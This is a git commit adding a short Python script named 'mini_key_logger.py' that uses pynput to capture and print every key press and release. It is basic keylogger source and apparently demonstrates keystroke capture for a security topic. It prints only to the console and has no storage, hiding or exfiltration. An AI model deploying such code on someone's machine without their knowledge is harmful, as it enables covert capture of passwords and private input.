abe05ac834bd3f9a60e31f1f80a4546cc833b217
PS Narayanan <thepsnarayanan@gmail.com>
2023-10-05 11:53:23 +0530

    Mini Key logger

---
+++ Security & Privacy/KeyLoggers/mini_key_logger.py
@@ -0,0 +1,10 @@
+from pynput import keyboard
+
+def on_press(key):
+    print(f'Key {key} pressed')
+
+def on_release(key):
+    print(f'Key {key} released')
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
